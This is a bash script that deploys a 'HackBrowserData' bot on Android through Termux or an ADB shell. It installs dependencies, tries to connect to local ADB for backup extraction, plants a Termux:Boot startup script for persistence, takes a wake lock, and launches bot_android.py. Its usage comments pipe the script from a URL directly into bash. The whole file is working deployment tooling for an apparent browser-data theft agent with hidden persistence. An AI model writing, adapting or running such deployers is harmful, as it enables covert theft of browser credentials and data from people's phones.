#!/data/data/com.termux/files/usr/bin/bash
# Also works with: /system/bin/sh, /bin/sh, bash
# ─────────────────────────────────────────────────────────────────
# HackBrowserData — Android Zero-Dep Bootstrap
# Deploys and runs the Android bot with ZERO pre-installed deps.
#
# USAGE (any of these work):
#   curl -sL <URL>/deploy_android.sh | bash
#   wget -qO- <URL>/deploy_android.sh | bash
#   bash deploy_android.sh
#   sh deploy_android.sh
#
# Works in: Termux, adb shell, any Android terminal emulator
# Auto-installs: Python3, pip, requests, pycryptodome, android-tools
# ─────────────────────────────────────────────────────────────────

set -e

SCRIPT_DIR="$(cd "$(dirname "$0" 2>/dev/null)" 2>/dev/null && pwd || echo /sdcard)"
BOT_FILE="${SCRIPT_DIR}/bot_android.py"

log() { echo "[deploy] $*"; }

# ── Detect environment ──────────────────────────────────────────
detect_env() {
    if [ -n "$PREFIX" ] && echo "$PREFIX" | grep -qi termux; then
        ENV="termux"
    elif [ -d /data/data/com.termux ]; then
        ENV="termux"
    elif command -v pkg >/dev/null 2>&1; then
        ENV="termux"
    else
        ENV="shell"
    fi
    log "Environment: $ENV"
}

# ── Install Termux packages ────────────────────────────────────
setup_termux() {
    log "Updating Termux packages..."
    yes | pkg update -y 2>/dev/null || true

    for p in python openssl sqlite android-tools; do
        if ! dpkg -s "$p" >/dev/null 2>&1; then
            log "Installing $p..."
            pkg install -y "$p" 2>/dev/null || true
        fi
    done

    log "Installing Python dependencies..."
    pip install --quiet requests pycryptodome 2>/dev/null || \
        python3 -m pip install --quiet requests pycryptodome 2>/dev/null || true
}

# ── Non-Termux: try to bootstrap minimal Python ────────────────
setup_shell() {
    if command -v python3 >/dev/null 2>&1; then
        log "Python3 found at $(command -v python3)"
    elif command -v python >/dev/null 2>&1; then
        log "Python found at $(command -v python)"
        alias python3=python
    else
        log "ERROR: No Python found and not in Termux."
        log "Install Termux from F-Droid: https://f-droid.org/packages/com.termux/"
        log "Then run this script inside Termux."
        exit 1
    fi

    python3 -m pip install --quiet --user requests pycryptodome 2>/dev/null || true
}

# ── Enable wireless ADB if possible ────────────────────────────
setup_adb() {
    if command -v adb >/dev/null 2>&1; then
        log "adb available, checking connection..."
        if adb devices 2>/dev/null | grep -q "device$"; then
            log "ADB already connected"
            return 0
        fi
        adb start-server 2>/dev/null || true
        # Try common wireless debugging ports
        for port in 5555 5037; do
            adb connect "localhost:$port" 2>/dev/null && \
                log "Connected to ADB on port $port" && return 0
        done
    fi
    log "ADB not connected (enable Wireless Debugging in Developer Options for backup extraction)"
    return 1
}

# ── Setup Termux:Boot for persistence ──────────────────────────
setup_boot() {
    BOOT_DIR="$HOME/.termux/boot"
    if [ -d "$HOME/.termux" ]; then
        mkdir -p "$BOOT_DIR"
        cat > "$BOOT_DIR/hbd_agent.sh" << BOOTEOF
#!/data/data/com.termux/files/usr/bin/bash
termux-wake-lock 2>/dev/null
python3 "$BOT_FILE" &
BOOTEOF
        chmod +x "$BOOT_DIR/hbd_agent.sh"
        log "Termux:Boot persistence installed"
    fi
}

# ── Acquire wake lock to prevent sleep ─────────────────────────
acquire_wakelock() {
    if command -v termux-wake-lock >/dev/null 2>&1; then
        termux-wake-lock 2>/dev/null || true
        log "Wake lock acquired"
    fi
}

# ── Main ───────────────────────────────────────────────────────
main() {
    log "HackBrowserData Android Deployer"
    log "================================"

    detect_env

    if [ "$ENV" = "termux" ]; then
        setup_termux
    else
        setup_shell
    fi

    setup_adb || true
    setup_boot
    acquire_wakelock

    if [ ! -f "$BOT_FILE" ]; then
        log "ERROR: bot_android.py not found at $BOT_FILE"
        log "Place bot_android.py in the same directory as this script."
        exit 1
    fi

    log "Starting bot..."
    exec python3 "$BOT_FILE"
}

main "$@"
